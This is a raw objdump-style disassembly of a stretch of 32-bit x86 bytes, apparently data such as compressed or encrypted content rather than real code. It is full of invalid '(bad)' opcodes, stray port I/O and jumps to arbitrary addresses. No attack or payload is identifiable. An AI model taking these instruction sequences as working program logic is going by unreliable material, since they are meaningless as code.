  42a9e1:	scas   eax,DWORD PTR es:[edi]
  42a9e2:	shl    BYTE PTR ds:0x8939a804,0x21
  42a9e9:	mov    ebx,0xc05b87a1
  42a9ee:	lods   eax,DWORD PTR ds:[esi]
  42a9ef:	cmc    
  42a9f0:	add    esp,DWORD PTR [ebx+0x108f7163]
  42a9f6:	mov    ah,0xf5
  42a9f8:	add    eax,DWORD PTR ds:0x10fc11ef
  42a9fe:	jo     0x42aa6e
  42aa00:	cmc    
  42aa01:	xchg   DWORD PTR [ebp-0x58],esp
  42aa04:	lods   eax,DWORD PTR ds:[esi]
  42aa05:	jg     0x42a9e2
  42aa07:	cmc    
  42aa08:	mov    bl,0x6f
  42aa0a:	inc    ecx
  42aa0b:	arpl   WORD PTR [eax+edx*4],ax
  42aa0e:	cld    
  42aa0f:	outs   dx,BYTE PTR ds:[esi]
  42aa10:	enter  0xbeb3,0x3c
  42aa14:	imul   DWORD PTR [edi-0x40]
  42aa17:	mov    ch,0x3
  42aa19:	add    eax,0x1ce3d1ee
  42aa1e:	pop    ds
  42aa1f:	xchg   esi,eax
  42aa20:	add    dl,BYTE PTR [eax+0x4a8ca5b2]
  42aa26:	pop    edx
  42aa27:	int    0xb2
  42aa29:	aaa    
  42aa2a:	gs popa 
  42aa2c:	sbb    al,0x0
  42aa2e:	add    BYTE PTR [eax],al
  42aa30:	add    BYTE PTR [eax],al
  42aa32:	adc    eax,0x9b700f65
  42aa37:	sub    eax,0xb29285aa
  42aa3c:	push   cs
  42aa3d:	rcr    al,cl
  42aa3f:	xchg   ebx,eax
  42aa40:	into   
  42aa41:	sub    ebx,ebp
  42aa43:	lock xor bh,cl
  42aa46:	es mov cl,0x97
  42aa49:	lahf   
  42aa4a:	lods   al,BYTE PTR ds:[esi]
  42aa4b:	out    dx,al
  42aa4c:	xchg   edi,eax
  42aa4d:	mov    esi,0xea276324
  42aa52:	inc    esi
  42aa53:	ror    BYTE PTR ds:0xde5a93e9,cl
  42aa59:	xor    BYTE PTR [edx-0x43150797],dh
  42aa5f:	and    al,0x4f
  42aa61:	jb     0x42aa42
  42aa63:	nop
  42aa64:	inc    esi
  42aa65:	add    ecx,DWORD PTR [eax+eax*1+0x5a882796]
  42aa6c:	repz xor al,0x8c
  42aa6f:	mov    dl,0xf7
  42aa71:	in     al,dx
  42aa72:	sbb    al,0xf6
  42aa74:	xor    dl,BYTE PTR [ecx]
  42aa76:	mul    BYTE PTR [edx+eax*2+0x19]
  42aa7a:	ins    BYTE PTR es:[edi],dx
  42aa7b:	mov    ebx,0x2e93e95b
  42aa80:	iret   
  42aa81:	rcl    DWORD PTR [edx+0x4b32a4b7],cl
  42aa87:	aaa    
  42aa88:	call   0x4ef6:0xeb292c9
  42aa8f:	jl     0x42aad5
  42aa91:	push   ecx
  42aa92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa93:	test   DWORD PTR [esi],0xe9
  42aa99:	add    BYTE PTR [eax],al
  42aa9b:	inc    eax
  42aa9c:	aaa    
  42aa9d:	xchg   edx,eax
  42aa9e:	leave  
  42aa9f:	xchg   edx,eax
  42aaa0:	mov    dl,0xe
  42aaa2:	test   BYTE PTR [edx],0x59
  42aaa5:	in     eax,dx
  42aaa6:	push   ds
  42aaa7:	jo     0x42ab10
  42aaa9:	arpl   bp,cx
  42aaab:	aas    
  42aaac:	imul   eax,DWORD PTR [edx],0xea44501
  42aab2:	add    dh,ch
  42aab4:	jno    0x42ab01
  42aab6:	mov    bh,BYTE PTR [edx+0x26]
  42aab9:	ins    DWORD PTR es:[edi],dx
  42aaba:	(bad)  
  42aabb:	cmc    
  42aabc:	in     eax,dx
  42aabd:	push   ss
  42aabe:	add    BYTE PTR [ebx],dl
  42aac0:	mov    al,0xe7
  42aac2:	mov    cl,0xd
  42aac4:	scas   al,BYTE PTR es:[edi]
  42aac5:	push   cs
  42aac6:	add    dh,ch
  42aac8:	imul   eax,DWORD PTR [eax],0xdfaeb913
  42aace:	fadd   DWORD PTR [edx]
  42aad0:	lock (bad) 
  42aad3:	sub    al,BYTE PTR [edi]
  42aad5:	sbb    eax,0xabd09323
  42aada:	push   ebp
  42aadb:	jb     0x42aa7f
  42aadd:	imul   esp,esp,0x21
  42aae0:	cs sti 
  42aae2:	or     dl,ah
  42aae4:	scas   eax,DWORD PTR es:[edi]
  42aae5:	push   cs
  42aae6:	push   ebx
  42aae7:	test   BYTE PTR [ecx+eax*2],bl
  42aaea:	push   0xffec8841
  42aaef:	xor    ah,BYTE PTR [ebp+0x5d9515e7]
  42aaf5:	sub    al,0x0
  42aaf7:	cmp    bl,BYTE PTR [edx]
  42aaf9:	xor    BYTE PTR [ecx+edi*4],bl
  42aafc:	xor    BYTE PTR [ebx+0x24],dh
  42aaff:	add    BYTE PTR [eax],al
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    cl,cl
  42ab05:	scas   eax,DWORD PTR es:[edi]
  42ab06:	cdq    
  42ab07:	inc    esp
  42ab08:	test   DWORD PTR [esi-0x65],esp
  42ab0b:	mov    WORD PTR [ebp+0x79000ed6],ss
  42ab11:	in     al,dx
  42ab12:	push   edx
  42ab13:	and    al,0x81
  42ab15:	ja     0x42aaaf
  42ab17:	inc    eax
  42ab18:	imul   esi,DWORD PTR [esi],0xaf78986c
  42ab1e:	push   cs
  42ab1f:	call   0x51489e
  42ab24:	repnz mov DWORD PTR [eax+0x6baf2912],edx
  42ab2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab2c:	push   ebp
  42ab2d:	fisttp DWORD PTR ds:0x10599000
  42ab33:	jg     0x42ab29
  42ab35:	ins    BYTE PTR es:[edi],dx
  42ab36:	push   0x10599001
  42ab3b:	lea    edx,[ebp*2+0x59900078]
  42ab42:	fwait
  42ab43:	jg     0x42ab49
  42ab45:	pop    edx
  42ab46:	adc    BYTE PTR [eax],al
  42ab48:	add    eax,0x9177f3d5
  42ab4d:	pop    ecx
  42ab4e:	adc    BYTE PTR [eax-0x31],dl
  42ab51:	aam    0xf3
  42ab53:	xchg   ebx,eax
  42ab54:	xchg   ecx,eax
  42ab55:	pop    ecx
  42ab56:	adc    al,ch
  42ab58:	inc    esi
  42ab59:	cdq    
  42ab5a:	adc    bh,bl
  42ab5c:	(bad)  
  42ab5d:	fucomip st,st(6)
  42ab5f:	pop    edi
  42ab60:	jle    0x42aafb
  42ab62:	adc    ch,BYTE PTR [eax-0x16]
  42ab65:	push   edi
  42ab66:	adc    BYTE PTR [eax],al
  42ab68:	add    BYTE PTR [eax],al
  42ab6a:	add    BYTE PTR [eax],al
  42ab6c:	add    BYTE PTR ds:0x919ff3d5,al
  42ab72:	pop    ecx
  42ab73:	adc    BYTE PTR [esi-0x70],ah
  42ab76:	test   eax,0xcd0dd30b
  42ab7b:	repz adc DWORD PTR [ecx-0x2b80efa7],0x54
  42ab83:	fwait
  42ab84:	jg     0x42ab9a
  42ab86:	pop    edx
  42ab87:	adc    BYTE PTR [eax],al
  42ab89:	or     eax,0x908ff3cd
  42ab8e:	pop    ecx
  42ab8f:	adc    BYTE PTR [eax-0x71],dl
  42ab92:	stos   BYTE PTR es:[edi],al
  42ab93:	sar    BYTE PTR [edi+0x13e1be0],0xd
  42ab9a:	inc    eax
  42ab9b:	hlt    
  42ab9c:	ja     0x42aba7
  42ab9e:	sbb    ah,dh
  42aba0:	outs   dx,DWORD PTR ds:[esi]
  42aba1:	sbb    DWORD PTR [eax],ebx
  42aba3:	hlt    
  42aba4:	jae    0x42ac1e
  42aba6:	in     al,dx
  42aba7:	push   esp
  42aba8:	sti    
  42aba9:	pop    edi
  42abaa:	jbe    0x42abbc
  42abac:	xchg   ax,ax
  42abae:	mov    dl,0x47
  42abb0:	add    DWORD PTR ds:0x908bd22f,ebx
  42abb6:	mov    dl,0xf5
  42abb8:	sub    ecx,DWORD PTR [edx+0x7a]
  42abbb:	sbb    eax,0xd9f7051e
  42abc0:	stos   DWORD PTR es:[edi],eax
  42abc1:	sbb    BYTE PTR [esi],dh
  42abc3:	inc    esi
  42abc4:	add    al,0x90
  42abc6:	mov    dl,0x72
  42abc8:	(bad)  
  42abc9:	jae    0x42ab55
  42abcb:	outs   dx,BYTE PTR ds:[esi]
  42abcc:	adc    BYTE PTR [eax],0xb4
  42abcf:	cmc    
  42abd0:	add    eax,DWORD PTR [eax]
  42abd2:	add    BYTE PTR [eax],al
  42abd4:	add    BYTE PTR [eax],al
  42abd6:	sbb    eax,0x18e811f7
  42abdb:	outs   dx,BYTE PTR ss:[esi]
  42abdd:	add    edx,DWORD PTR [eax-0x4c37b54e]
  42abe3:	mov    ds:0x964c8b05,al
  42abe8:	sbb    DWORD PTR [ebx-0x74f269bc],ecx
  42abee:	cmp    al,0x96
  42abf0:	in     eax,0x1c
  42abf2:	ret    0xddcc
  42abf5:	mov    ss,WORD PTR [esi+edx*4+0x39]
  42abf9:	stos   BYTE PTR es:[edi],al
  42abfa:	(bad)  
  42abfb:	icebp  
  42abfc:	test   BYTE PTR ds:0x8eca763f,dh
  42ac02:	dec    esp
  42ac03:	xchg   esi,eax
  42ac04:	add    eax,0xf5cc9faa
  42ac09:	mov    bl,0xaa
  42ac0b:	mov    DWORD PTR [ecx-0x3589e0bd],ebp
  42ac11:	mov    es,WORD PTR [esi+edx*4+0x1]
  42ac15:	mov    ah,0x18
  42ac17:	not    BYTE PTR [ecx]
  42ac19:	test   al,0x18
  42ac1b:	neg    BYTE PTR [ecx]
  42ac1d:	lods   al,BYTE PTR ds:[esi]
  42ac1e:	ja     0x42ac01
  42ac20:	sbb    BYTE PTR [eax+edx*4],al
  42ac23:	das    
  42ac24:	mov    edx,0x792bbbe7
  42ac29:	mov    BYTE PTR [ecx+0x8e90eb2],dl
  42ac2f:	jns    0x42ac28
  42ac31:	mov    bl,0x83
  42ac33:	pop    ebp
  42ac34:	in     al,dx
  42ac35:	xchg   ebx,eax
  42ac36:	fmul   DWORD PTR [esi]
  42ac39:	push   ds
  42ac3a:	add    BYTE PTR [eax],al
  42ac3c:	add    BYTE PTR [eax],al
  42ac3e:	add    BYTE PTR [edi-0x67],bl
  42ac41:	(bad)  
  42ac42:	lods   eax,DWORD PTR ds:[esi]
  42ac43:	xchg   ebx,eax
  42ac44:	pop    ebp
  42ac45:	add    dl,BYTE PTR [ecx+0x6c0ea141]
  42ac4b:	aam    0xe6
  42ac4d:	pop    ss
  42ac4e:	mov    WORD PTR es:[esi-0x68],?
  42ac52:	test   eax,0xe5472b93
  42ac57:	push   0x1ea92160
  42ac5c:	inc    esi
  42ac5d:	xor    edx,DWORD PTR [ecx+0x620eb293]
  42ac63:	dec    ebx
  42ac64:	dec    edx
  42ac65:	fucom  st(2)
  42ac67:	xchg   esp,eax
  42ac68:	pop    ebp
  42ac69:	xchg   ebx,eax
  42ac6a:	test   eax,0xb297b806
  42ac6f:	mov    ebx,0x7cb6ed00
  42ac74:	ss iret 
  42ac76:	xor    al,0x52
  42ac78:	das    
  42ac79:	mov    eax,0xeb292c9
  42ac7e:	out    dx,al
  42ac7f:	pop    ebp
  42ac80:	loope  0x42aca8
  42ac82:	call   0x9b95f1a
  42ac87:	push   0xffffffb2
  42ac89:	push   cs
  42ac8a:	adc    edx,DWORD PTR [edi+eax*1+0x389e7e3f]
  42ac91:	(bad)  
  42ac92:	sub    BYTE PTR [ecx+eiz*8-0x5100911a],dl
  42ac99:	sub    ebx,ebp
  42ac9b:	xchg   edx,eax
  42ac9c:	mov    dl,0xe
  42ac9e:	aad    0x98
  42aca0:	stos   DWORD PTR es:[edi],eax
  42aca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aca2:	bound  eax,QWORD PTR [eax]
  42aca4:	add    BYTE PTR [eax],al
  42aca6:	add    BYTE PTR [eax],al
  42aca8:	pop    ebx
  42aca9:	mov    bl,0xe
  42acab:	jmp    0xa42008
  42acb0:	dec    esp
  42acb1:	sub    edx,esp
  42acb3:	call   0x2a7133
  42acb8:	hlt    
  42acb9:	das    
  42acba:	xor    ebp,DWORD PTR [eax-0x17f14b97]
  42acc0:	jg     0x42ac69
  42acc2:	push   cs
  42acc3:	add    BYTE PTR [edx-0x556b6c03],ah
  42acc9:	push   ebx
  42acca:	verw   WORD PTR [ecx]
  42accd:	jnp    0x42ac6c
  42accf:	pushf  
  42acd0:	cmp    BYTE PTR [esi+ecx*1+0xddfad0f],dh
  42acd7:	add    BYTE PTR [ecx],ch
  42acd9:	sub    ebp,DWORD PTR [esp+ebx*2+0x28]
  42acdd:	mov    ah,0xe
  42acdf:	cmp    ecx,DWORD PTR [ecx+0x42]
  42ace2:	sbb    eax,DWORD PTR [ebp-0x74e8bcc7]
  42ace8:	xor    cl,BYTE PTR [edi-0x44390cb9]
  42acee:	repz xchg esp,eax
  42acf0:	jmp    0x42ace0
  42acf2:	xchg   esi,eax
  42acf3:	dec    esp
  42acf4:	lea    esp,[edx+0x19]
  42acf7:	mov    dh,0x28
  42acf9:	xor    BYTE PTR [ebx+0xeb6f183],dl
  42acff:	add    BYTE PTR [esi+esi*8],bh
  42ad02:	bound  eax,QWORD PTR ds:0x741423b0
  42ad08:	mov    ecx,0x88cdb9
  42ad0d:	add    BYTE PTR [eax],al
  42ad0f:	add    BYTE PTR [eax],al
  42ad11:	xchg   ebp,eax
  42ad12:	push   edx
  42ad13:	add    BYTE PTR [eax-0x1d834cf0],al
  42ad19:	add    BYTE PTR [edi],ah
  42ad1b:	verw   WORD PTR [ecx+0x32c1a0ac]
  42ad22:	add    ch,BYTE PTR [eax+ecx*1+0x78]
  42ad26:	mov    bl,0xe
  42ad28:	test   edi,ebx
  42ad2a:	stos   DWORD PTR es:[edi],eax
  42ad2b:	xchg   edx,eax
  42ad2c:	ds nop
  42ad2e:	dec    edx
  42ad2f:	adc    BYTE PTR [eax],al
  42ad31:	add    eax,0x90cbeed5
  42ad36:	dec    ecx
  42ad37:	adc    BYTE PTR [eax+0x67],dl
  42ad3a:	daa    
  42ad3b:	sbb    bl,bh
  42ad3d:	out    0x4d,al
  42ad3f:	or     DWORD PTR ds:0xffd08654,edx
  42ad45:	adc    al,0x89
  42ad47:	pop    ss
  42ad48:	test   DWORD PTR [edi+0x4600104a],ebx
  42ad4e:	int    0xee
  42ad50:	retf   
  42ad51:	nop
  42ad52:	dec    ecx
  42ad53:	adc    BYTE PTR [eax],cl
  42ad55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ad56:	sub    bl,cl
  42ad58:	sub    DWORD PTR [ebp+edi*4+0x12],0x0
  42ad5d:	nop
  42ad5e:	pop    eax
  42ad5f:	pop    edi
  42ad60:	ror    BYTE PTR [ecx+ecx*4],0x17
  42ad64:	test   DWORD PTR [ebx],ecx
  42ad66:	dec    ecx
  42ad67:	adc    BYTE PTR [eax],al
  42ad69:	sti    
  42ad6a:	mov    dh,0x9b
  42ad6c:	xchg   DWORD PTR [eax],ebx
  42ad6e:	dec    edx
  42ad6f:	adc    BYTE PTR [eax],al
  42ad71:	push   0x4a
  42ad73:	xchg   edi,eax
  42ad74:	test   BYTE PTR [eax],al
  42ad76:	add    BYTE PTR [eax],al
  42ad78:	add    BYTE PTR [eax],al
  42ad7a:	mov    ah,0x75
  42ad7c:	adc    BYTE PTR [eax],al
  42ad7e:	nop
  42ad7f:	mov    ecx,0x27f9eb3a
  42ad84:	or     DWORD PTR [eax+edx*8+0x1b5115a5],eax
  42ad8b:	in     al,0x8f
  42ad8d:	add    DWORD PTR [eax+0x20e7a149],edx
  42ad93:	cli    
  42ad94:	sldt   WORD PTR ds:0x90f7cbd5
  42ad9b:	dec    ecx
  42ad9c:	adc    BYTE PTR [eax+0x1b],dl
  42ad9f:	(bad)  
  42ada2:	pop    ebp
  42ada3:	dec    ecx
  42ada4:	adc    BYTE PTR [edi+0x7508d598],al
  42adaa:	push   ebp
  42adab:	mov    bl,0x4b
  42adad:	jg     0x42ad5b
  42adaf:	outs   dx,BYTE PTR ds:[esi]
  42adb0:	test   BYTE PTR [ebx],0x90
  42adb3:	mov    bl,0xf4
  42adb5:	jg     0x42adc2
  42adb7:	mov    bl,0xf5
  42adb9:	add    ebp,edi
  42adbb:	push   ds
  42adbc:	sbb    dh,BYTE PTR [eax+edx*4]
  42adbf:	mov    dl,0xf5
  42adc1:	add    ecx,DWORD PTR [ebx+0x507f3647]
  42adc7:	scas   al,BYTE PTR es:[edi]
  42adc8:	jb     0x42ae42
  42adca:	nop
  42adcb:	mov    dl,0xf5
  42adcd:	mov    ss,WORD PTR [edx-0x6fff9a36]
  42add3:	mov    dl,0x72
  42add5:	xchg   DWORD PTR [esi+ebp*1-0xd],ebp
  42add9:	add    edx,DWORD PTR [eax+0x876303]
  42addf:	add    BYTE PTR [eax],al
  42ade1:	add    BYTE PTR [eax],al
  42ade3:	ins    BYTE PTR es:[edi],dx
  42ade4:	mov    dl,0xf6
  42ade6:	add    edx,DWORD PTR [eax+0x1b497103]
  42adec:	add    ebp,esi
  42adee:	adc    al,0xdc
  42adf1:	push   ecx
  42adf2:	mov    ah,0x14
  42adf4:	inc    edi
  42adf5:	adc    cl,BYTE PTR [eax-0x790a4d6b]
  42adfb:	add    al,0x97
  42adfd:	fld    DWORD PTR [eax+edx*4]
  42ae00:	mov    dl,0xbd
  42ae02:	shl    DWORD PTR [ebp-0x1f7252a3],0x37
  42ae09:	lods   al,BYTE PTR ds:[esi]
  42ae0a:	nop
  42ae0b:	xchg   ebp,eax
  42ae0c:	sub    DWORD PTR [esp+esi*8],esi
  42ae0f:	adc    al,0x73
  42ae11:	or     dh,ch
  42ae13:	shl    esp,0xe
  42ae16:	add    eax,DWORD PTR [ebp-0x6c]
  42ae19:	jp     0x42ae5f
  42ae1b:	cmp    al,0xab
  42ae1d:	outs   dx,DWORD PTR ds:[esi]
  42ae1e:	ret    0x9e88
  42ae21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ae22:	xchg   ebp,eax
  42ae23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae24:	out    0xee,eax
  42ae26:	mov    WORD PTR [edi],ss
  42ae28:	cmp    ecx,DWORD PTR [edi]
  42ae2a:	call   0xe9bb60c2
  42ae2f:	push   ss
  42ae30:	xor    esp,DWORD PTR ss:[ebp-0x74]
  42ae34:	mov    dl,0xe
  42ae36:	mov    ecx,0x568599ab
  42ae3b:	cdq    
  42ae3c:	ss iret 
  42ae3e:	aam    0x9b
  42ae40:	add    BYTE PTR [eax-0x1fa44bce],bl
  42ae46:	add    BYTE PTR ds:[eax],al
  42ae49:	add    BYTE PTR [eax],al
  42ae4b:	add    BYTE PTR [ecx+0x35],bh
  42ae4e:	fld    QWORD PTR [ecx+0x77]
  42ae51:	xor    esp,ebp
  42ae53:	mov    cs:0x8c353336,al
  42ae59:	mov    dl,0xe
  42ae5b:	jmp    0x42ade5
  42ae5d:	ss es pop ss
  42ae60:	cdq    
  42ae61:	pop    ecx
  42ae62:	nop
  42ae63:	dec    ebp
  42ae64:	xor    BYTE PTR [ecx-0x4d6c16f1],al
  42ae6a:	sbb    edx,DWORD PTR [esp+edx*8+0x36]
  42ae6e:	iret   
  42ae6f:	out    0x97,al
  42ae71:	sub    ebp,ebp
  42ae73:	out    dx,al
  42ae74:	test   al,0x59
  42ae76:	arpl   WORD PTR ds:0xd1d83400,cx
  42ae7c:	repz dec edx
  42ae7e:	in     al,dx
  42ae7f:	(bad)  
  42ae80:	add    al,0x75
  42ae82:	mul    DWORD PTR [ebx]
  42ae84:	mov    edx,0x98d0ec59
  42ae89:	pop    eax
  42ae8a:	in     al,dx
  42ae8b:	mov    esi,0xd9b2e22
  42ae90:	push   0x7be90eb2
  42ae95:	mov    edx,eax
  42ae97:	jmp    0xc5ad8c2f
  42ae9c:	pop    ds
  42ae9d:	pop    ebp
  42ae9e:	cdq    
  42ae9f:	fdivr  st(3),st
  42aea1:	scas   al,BYTE PTR es:[edi]
  42aea2:	dec    esi
  42aea3:	jmp    0x12e61c7
  42aea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aea9:	jl     0x42af1b
  42aeab:	inc    DWORD PTR [edi]
  42aead:	imul   esp,DWORD PTR ss:[eax+eax*1],0x0
  42aeb2:	add    BYTE PTR [eax],al
  42aeb4:	add    BYTE PTR [ecx-0x1f99d4a],cl
  42aeba:	sub    esi,DWORD PTR [eax]
  42aebc:	pusha  
  42aebd:	out    dx,al
  42aebe:	mov    eax,ds:0x4a954c99
  42aec3:	hlt    
  42aec4:	cmp    BYTE PTR [esi+esi*4-0x2d6374f2],al
  42aecb:	sbb    al,0x40
  42aecd:	jns    0x42af04
  42aecf:	push   ebx
  42aed0:	and    al,0x59
  42aed2:	and    cl,ch
  42aed4:	xlat   BYTE PTR ds:[ebx]
  42aed5:	in     al,dx
  42aed6:	jae    0x42af08
  42aed8:	jo     0x42aeab
  42aeda:	stos   DWORD PTR es:[edi],eax
  42aedb:	sar    edi,1
  42aedd:	outs   dx,BYTE PTR ds:[esi]
  42aede:	xor    al,0x9b
  42aee0:	and    al,0xa9
  42aee2:	scas   eax,DWORD PTR es:[edi]
  42aee3:	push   cs
  42aee4:	add    BYTE PTR [ecx-0x61002e79],dl
  42aeea:	xor    al,0x93
  42aeec:	and    al,0xc9
  42aeee:	scas   eax,DWORD PTR es:[edi]
  42aeef:	push   cs
  42aef0:	add    cl,bh
  42aef2:	mov    edx,0x7b9d83bf
  42aef7:	js     0x42aef9
  42aef9:	test   DWORD PTR [ecx+0xa9574e7],esi
  42aeff:	jmp    0x33751bda
  42af04:	js     0x42aeee
  42af06:	scas   eax,DWORD PTR es:[edi]
  42af07:	push   cs
  42af08:	push   eax
  42af09:	fimul  WORD PTR [ebx-0x1d6a736d]
  42af0f:	or     eax,0x929ce900
  42af14:	and    al,0x39
  42af16:	mov    ch,0xe
  42af18:	add    BYTE PTR [eax],al
  42af1a:	add    BYTE PTR [eax],al
  42af1c:	add    BYTE PTR [eax],al
  42af1e:	add    DWORD PTR [ebp+0x2c],esi
  42af21:	add    BYTE PTR [ecx],ah
  42af23:	inc    ebp
  42af24:	pop    ss
  42af25:	add    BYTE PTR [ecx-0x6fdb64d6],ch
  42af2b:	icebp  
  42af2c:	adc    al,BYTE PTR [eax]
  42af2e:	nop
  42af2f:	xor    edx,ebx
  42af31:	int    0x90
  42af33:	dec    ecx
  42af34:	cdq    
  42af35:	dec    esp
  42af36:	je     0x42afb5
  42af38:	sub    eax,0xc4816c44
  42af3d:	mov    edx,eax
  42af3f:	dec    ecx
  42af40:	cmp    BYTE PTR [ecx-0x67],ah
  42af43:	dec    ecx
  42af44:	adc    BYTE PTR [ebx-0x22],bl
  42af47:	push   ds
  42af48:	test   eax,0x51266d86
  42af4d:	jg     0x42afcb
  42af4f:	dec    ebp
  42af50:	mov    eax,ds:0xb63cbe54
  42af55:	dec    DWORD PTR [edx]
  42af57:	call   0xfff0:0x6b12ffb8
  42af5e:	adc    dh,BYTE PTR [ebx-0x34]
  42af61:	call   DWORD PTR [edx]
  42af63:	sub    edi,eax
  42af65:	jmp    FWORD PTR [ecx-0x4883c7b7]
  42af6b:	dec    ecx
  42af6c:	adc    BYTE PTR [eax+edx*2-0x6f259384],al
  42af73:	dec    ecx
  42af74:	adc    BYTE PTR [ebp+0x4fcc75d4],cl
  42af7a:	or     edx,DWORD PTR [ebx+0x498f033a]
  42af80:	adc    BYTE PTR [eax+eax*1+0x0],al
  42af87:	shl    BYTE PTR [ebx+0x6c],1
  42af8a:	(bad)  
  42af8b:	nop
  42af8c:	dec    ecx
  42af8d:	adc    BYTE PTR [edi],ch
  42af8f:	in     eax,0xa9
  42af91:	mov    dh,0x23
  42af93:	test   bh,ch
  42af95:	adc    cl,BYTE PTR [ebp+0x4fe6ad4c]
  42af9b:	push   0x56
  42af9d:	xchg   edi,eax
  42af9e:	inc    esp
  42af9f:	lods   al,BYTE PTR ds:[esi]
  42afa0:	mov    cl,0xa2
  42afa2:	cli    
  42afa3:	xchg   BYTE PTR [edi+ebx*8],cl
  42afa6:	aas    
  42afa7:	mov    ds:0x150435b2,al
  42afac:	jb     0x42afab
  42afae:	jg     0x42afc3
  42afb0:	mov    dl,0xf5
  42afb2:	add    ebp,DWORD PTR [edi]
  42afb4:	(bad)  
  42afb6:	sti    
  42afb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afb8:	ficom  WORD PTR [ecx]
  42afba:	sbb    DWORD PTR [esi+edx*4],0xffffffed
  42afbe:	add    BYTE PTR ds:0xb3c770d9,bl
  42afc4:	mov    dh,0xa8
  42afc6:	lds    ebx,FWORD PTR [edi-0x500443d4]
  42afcc:	out    dx,al
  42afcd:	adc    esp,esp
  42afcf:	push   cs
  42afd0:	out    dx,eax
  42afd1:	sbb    eax,esi
  42afd3:	mov    esi,0x671c717d
  42afd8:	push   edi
  42afd9:	leave  
  42afda:	cmp    ebx,edi
  42afdc:	jno    0x42afd1
  42afde:	add    BYTE PTR [edi-0x4d],0x6e
  42afe2:	(bad)  
  42afe3:	jae    0x42af9b
  42afe5:	loopne 0x42af9e
  42afe7:	jae    0x42af73
  42afe9:	mov    WORD PTR [edx+0x0],?
  42afef:	add    BYTE PTR [ebp+0x7397f0b0],ch
  42aff5:	mov    cs,WORD PTR [edx+ecx*8+0x3f65c10]
  42affc:	lock mov dl,0x6c
  42afff:	ret    0xb2b5
  42b002:	mov    BYTE PTR [esi+0x2c0e690e],ch
  42b008:	mov    dh,BYTE PTR [edx-0x212f800b]
  42b00e:	and    al,0x81
  42b010:	push   edx
  42b011:	xchg   edx,eax
  42b012:	test   BYTE PTR [eax-0x1fddd415],0x83
  42b019:	xor    eax,0x5fe7e024
  42b01e:	cmp    ah,al
  42b020:	jg     0x42afd5
  42b022:	cld    
  42b023:	jle    0x42b08b
  42b025:	pop    ecx
  42b026:	movzx  esp,BYTE PTR [ebp-0x37fa9527]
  42b02d:	pop    ecx
  42b02e:	sbb    eax,0xec5d1d6f
  42b033:	sahf   
  42b034:	popf   
  42b035:	hlt    
  42b036:	ss and ch,0x5c
  42b03a:	in     al,dx
  42b03b:	mov    ?,WORD PTR [ebx+esi*4]
  42b03e:	test   eax,0xd532ef08
  42b044:	jmp    0x195f0ca2
  42b049:	ins    BYTE PTR es:[edi],dx
  42b04a:	test   DWORD PTR [edi+0x1e],0xd46dec59
  42b051:	ficomp WORD PTR [edx]
  42b053:	pop    esi
  42b054:	add    BYTE PTR [eax],al
  42b056:	add    BYTE PTR [eax],al
  42b058:	add    BYTE PTR [esi+0x5c],al
  42b05b:	add    ah,BYTE PTR [ecx]
  42b05d:	arpl   WORD PTR [ecx-0x20339bf2],bx
  42b063:	leave  
  42b064:	sti    
  42b065:	sar    ebp,cl
  42b067:	dec    esp
  42b068:	pushf  
  42b069:	sbb    al,bl
  42b06b:	rcl    ch,cl
  42b06d:	rol    BYTE PTR [eax+ebx*4],1
  42b070:	cmp    BYTE PTR [ecx],dl
  42b072:	pushf  
  42b073:	jmp    0x42b012
  42b075:	xchg   esi,eax
  42b076:	fldcw  WORD PTR [ecx+ebp*8]
  42b079:	pop    es
  42b07a:	mov    cl,0xeb
  42b07c:	fild   WORD PTR [edi+edi*4+0x5953f88e]
  42b083:	cdq    
  42b084:	aaa    
  42b085:	ins    BYTE PTR es:[edi],dx
  42b086:	inc    eax
  42b087:	push   0xffffffe9
  42b089:	xchg   ebx,eax
  42b08a:	xor    ebp,ebx
  42b08c:	add    esi,ebp
  42b08e:	mov    al,0xe
  42b090:	jmp    0xab9024ad
  42b095:	call   FWORD PTR [eax+0x41]
  42b098:	aaa    
  42b099:	and    eax,0x94431ecf
  42b09e:	pop    ebp
  42b09f:	and    al,BYTE PTR [ecx]
  42b0a1:	adc    esi,ebp
  42b0a3:	push   cs
  42b0a4:	add    BYTE PTR [edx-0x65],ah
  42b0a7:	xchg   ebx,eax
  42b0a8:	stc    
  42b0a9:	push   ss
  42b0aa:	dec    eax
  42b0ab:	adc    bh,BYTE PTR fs:[ecx-0x52]
  42b0af:	xchg   ebx,eax
  42b0b0:	lock sub al,0xa7
  42b0b3:	bound  ebx,QWORD PTR [eax]
  42b0b5:	sub    ch,BYTE PTR [edi-0x59987c19]
  42b0bb:	out    0x83,eax
  42b0bd:	add    BYTE PTR [eax],al
  42b0bf:	add    BYTE PTR [eax],al
  42b0c1:	add    BYTE PTR [edi-0x56],dh
  42b0c4:	out    0x83,eax
  42b0c6:	(bad)  
  42b0c7:	pop    esi
  42b0c8:	in     al,dx
  42b0c9:	or     BYTE PTR [edi+0x7788ec62],0x56
  42b0d0:	cmc    
  42b0d1:	add    cl,BYTE PTR [edx-0x5a]
  42b0d4:	xchg   ecx,eax
  42b0d5:	idiv   BYTE PTR [eax+ebx*2+0x3d]
  42b0d9:	shl    dl,0x5c
  42b0dc:	xchg   ebp,eax
  42b0dd:	into   
  42b0de:	add    BYTE PTR [esi-0xc],bh
  42b0e1:	jg     0x42b0aa
  42b0e3:	mov    esi,0x28b984e7
  42b0e8:	adc    dl,BYTE PTR [ecx-0x1e]
  42b0eb:	in     eax,dx
  42b0ec:	test   BYTE PTR [ebx-0x1418416a],0xdc
  42b0f3:	sub    dl,cl
  42b0f5:	pop    edi
  42b0f6:	pop    ss
  42b0f7:	sbb    ebp,DWORD PTR [ebp+0x6b8fc255]
  42b0fd:	in     al,dx
  42b0fe:	xchg   ecx,eax
  42b0ff:	das    
  42b100:	push   edx
  42b101:	cld    
  42b102:	jmp    0x1c28:0x96504105
  42b109:	mov    ebx,DWORD PTR [eax]
  42b10b:	xor    BYTE PTR [edx+0x8],bl
  42b10e:	ficomp DWORD PTR [edx+0x2249e85b]
  42b114:	in     al,dx
